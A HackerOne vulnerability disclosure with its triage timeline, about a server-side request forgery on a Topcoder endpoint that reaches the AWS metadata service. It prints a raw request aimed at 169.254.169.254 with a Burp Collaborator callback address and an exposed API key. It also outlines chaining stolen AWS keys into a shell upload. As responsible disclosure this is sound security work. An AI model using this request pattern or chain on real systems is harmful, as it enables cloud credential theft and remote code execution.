---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/server-side-request-forgery-ssrf
  - env/cloud
  - stack/aws
substate: "resolved"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
date: 2021-09-16
submitted: 2020-09-11T01:32:47.653Z
bounty_usd: null
votes: 30
cve: []
program: "[[programs/lab45|Lab45]]"
reporter: "zhh"
source: "https://hackerone.com/reports/978823"
title: "SSRF to AWS file read"
---
# SSRF to AWS file read

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 30 | **Program:** Lab45 | **Disclosed:** 2021-09-16

- Report: [https://hackerone.com/reports/978823](https://hackerone.com/reports/978823)
- CWE: Server-Side Request Forgery (SSRF)
- Submitted: 2020-09-11T01:32:47.653Z

## Timeline

- **Report Filed**
- **2020-09-11** @zhh: I might be able to upgrade this to RCE, by accessing the accesskey and secret key. then use that key to upload the shell to your bucket, but I wouldn't do that without the permission of the program owner.
- **2020-09-11** @bluetooth_headset: Hi @3viltwin,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@bluetooth_headset
- **2020-09-11** @bluetooth_headset: Hi @3viltwin - I'm discussing this submission internally with the Topcoder team. You will be updated as soon as there is additional information to share. Thanks for your patience!
- **2020-09-11** @zhh: 1. It looks like the link on the web is removed but the call to the endpoint remains active
2. my suggestion to fix, disable that endpoint too
3. as I said before, maybe it can be chain to rce (if allowed). the scenario is like => I get access key and secret key (SSRF) => use this key to access bucket => upload shell (RCE).
- **2020-09-14** @zhh: hi i made a direct call to the endpoint and it shows 403, i think this bug has been fixed, i also tried the endpoint to call the collaborator and it still shows 403. can you review my report and you can check it too

`GET /community-app-assets/api/proxy-post?url=http%3A%2F%2F169.254.169.254 HTTP/1.1
Host: cognitive.topcoder.com
Content-Length: 108
Authorization: ApiKey 130edef6-2289-4407-bfcf-3eedacebb860
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://cognitive.topcoder.com
Referer: http://cognitive.topcoder.com/ibm-cloud
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9`

`b_65bd5a1857b73643aad556093_934e9ffdc5=&EMAIL=eviltwin%404w15ul5vh79meeab3xqz2jk45vbpze.burpcollaborator.net`


response


`HTTP/1.1 403 Forbidden
Server: awselb/2.0
Date: Mon, 14 Sep 2020 03:35:07 GMT
Content-Type: text/html
Content-Length: 536
Connection: keep-alive`

`<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
</body>
</html>
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->`

screenshot: F987003
- **2020-09-14** @bluetooth_headset: Hi @3viltwin - Thanks for sharing this information with us. We are still looking into this report and will update you when we have additional information to share. Thanks for your patience!
- **Report Resolved**
- **2020-09-22** @zhh: can i write this on my blog?
- **2020-09-22** @jwheeler: Of course. I appreciate you asking. Thanks for being so quick to point out that this was not fixed as I first thought.
- **2020-09-22** @zhh: Thank you sir, can I also include my PoC video in the blog too?
- **2020-09-24** @jwheeler: Yes.
- **2021-09-15** @zhh: Hi,
can this be `disclose in a limited` way?.

thank you
- **Agreed On Going Public**
- **2021-09-16** @zhh: can the report be disclosed in a limited?
- **Agreed On Going Public**
- **Report Became Public**
